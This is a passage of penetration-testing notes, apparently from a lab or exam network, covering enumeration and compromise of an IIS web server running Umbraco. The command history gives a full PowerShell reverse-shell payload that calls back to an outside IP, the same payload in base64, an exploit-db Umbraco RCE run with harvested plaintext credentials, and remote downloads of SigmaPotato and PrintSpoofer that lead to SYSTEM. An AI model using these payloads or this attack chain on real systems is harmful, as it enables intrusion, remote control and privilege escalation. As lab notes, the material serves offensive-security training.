ProgramFiles                   C:\Program Files                                                                        
ProgramFiles(x86)              C:\Program Files (x86)                                                                  
ProgramW6432                   C:\Program Files                                                                        
PSModulePath                   WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\syste...
PUBLIC                         C:\Users\Public                                                                         
SystemDrive                    C:                                                                                      
SystemRoot                     C:\Windows                                                                              
TEMP                           C:\Windows\TEMP                                                                         
TMP                            C:\Windows\TEMP                                                                         
USERDOMAIN                     WORKGROUP                                                                               
USERNAME                       WEB02$                                                                                  
USERPROFILE                    C:\Windows\system32\config\systemprofile                                                
windir                         C:\Windows  
```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
`gobuster dir -u http://192.168.152.247/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt`
```
/.html                (Status: 403) [Size: 305]
/index.php            (Status: 200) [Size: 4269]
/img                  (Status: 301) [Size: 341] [--> http://192.168.152.247/img/]
/assets               (Status: 301) [Size: 344] [--> http://192.168.152.247/assets/]
/css                  (Status: 301) [Size: 341] [--> http://192.168.152.247/css/]
/pdfs                 (Status: 301) [Size: 342] [--> http://192.168.152.247/pdfs/]
/Index.php            (Status: 200) [Size: 4269]
/applications.html    (Status: 200) [Size: 3607]
/js                   (Status: 301) [Size: 340] [--> http://192.168.152.247/js/]
/examples             (Status: 503) [Size: 405]
/licenses             (Status: 403) [Size: 424]
/Applications.html    (Status: 200) [Size: 3607]
/dashboard            (Status: 301) [Size: 347] [--> http://192.168.152.247/dashboard/]
/%20                  (Status: 403) [Size: 305]
/IMG                  (Status: 301) [Size: 341] [--> http://192.168.152.247/IMG/]
/Assets               (Status: 301) [Size: 344] [--> http://192.168.152.247/Assets/]
/INDEX.php            (Status: 200) [Size: 4269]
/PDFs                 (Status: 301) [Size: 342] [--> http://192.168.152.247/PDFs/]
/*checkout*           (Status: 403) [Size: 305]
/*checkout*.php       (Status: 403) [Size: 305]
/*checkout*.html      (Status: 403) [Size: 305]
/*checkout*.txt       (Status: 403) [Size: 305]
/CSS                  (Status: 301) [Size: 341] [--> http://192.168.152.247/CSS/]
/Img                  (Status: 301) [Size: 341] [--> http://192.168.152.247/Img/]
/JS                   (Status: 301) [Size: 340] [--> http://192.168.152.247/JS/]
/phpmyadmin           (Status: 403) [Size: 305]
/webalizer            (Status: 403) [Size: 305]
/*docroot*            (Status: 403) [Size: 305]
/*docroot*.txt        (Status: 403) [Size: 305]
/*docroot*.html       (Status: 403) [Size: 305]
/*docroot*.php        (Status: 403) [Size: 305]
/*.php                (Status: 403) [Size: 305]
/*                    (Status: 403) [Size: 305]
/*.txt                (Status: 403) [Size: 305]
/*.html               (Status: 403) [Size: 305]
/con.txt              (Status: 403) [Size: 305]
/con                  (Status: 403) [Size: 305]
/con.php              (Status: 403) [Size: 305]
/con.html             (Status: 403) [Size: 305]
/Dashboard            (Status: 301) [Size: 347] [--> http://192.168.152.247/Dashboard/]
/http%3A              (Status: 403) [Size: 305]
/http%3A.php          (Status: 403) [Size: 305]
/http%3A.html         (Status: 403) [Size: 305]
/http%3A.txt          (Status: 403) [Size: 305]
/**http%3a            (Status: 403) [Size: 305]
/**http%3a.php        (Status: 403) [Size: 305]
/**http%3a.html       (Status: 403) [Size: 305]
/**http%3a.txt        (Status: 403) [Size: 305]
/xampp                (Status: 301) [Size: 343] [--> http://192.168.152.247/xampp/]
/.html                (Status: 403) [Size: 305]
/aux.php              (Status: 403) [Size: 305]
/aux                  (Status: 403) [Size: 305]
/aux.txt              (Status: 403) [Size: 305]
/aux.html             (Status: 403) [Size: 305]
/*http%3A.txt         (Status: 403) [Size: 305]
/*http%3A.php         (Status: 403) [Size: 305]
/*http%3A.html        (Status: 403) [Size: 305]
/*http%3A             (Status: 403) [Size: 305]
/**http%3A            (Status: 403) [Size: 305]
/**http%3A.txt        (Status: 403) [Size: 305]
/**http%3A.html       (Status: 403) [Size: 305]
/**http%3A.php        (Status: 403) [Size: 305]
/%C0.php              (Status: 403) [Size: 305]
/%C0                  (Status: 403) [Size: 305]
/%C0.txt              (Status: 403) [Size: 305]
/%C0.html             (Status: 403) [Size: 305]
```

# Command History
```c
    enum4linux -a 192.168.240.247
    //http://web02.relia.com:14080/umbraco#/login/false?returnPath=%252Fumbraco
    //searchsploit umbraco 48988....
    ftp 192.168.203.247 -p 14020
    // anonymous no password
    // umbraco.pdf
    get umbraco.pdf
    // indicates umbraco version 7, contains connection info and password
    //exploit-db find 49488
    // create umbraco_49488.py

    // echo to rev_ps
    $client = New-Object System.Net.Sockets.TCPClient("192.168.45.214",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
    cat rev_ps | iconv -t UTF-16LE | base64 -w 0
    // base64 encoded
    // JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0ACgAKAAoA
    // start listener on 4444
    // CONNECTION
    python3 ./tools/umbraco_49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080/' -c powershell -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0ACgAKAAoA"
    // obtain reverse shell as iis apppool\defaultapppool
    cd C:\Window\Temp
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/SigmaPotato.exe -OutFile SigmaPotato.exe"
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"

    //reverse shell with sigmapotato
    ./sigmapotato.exe --revshell 192.168.45.214 4445
    // got system
```
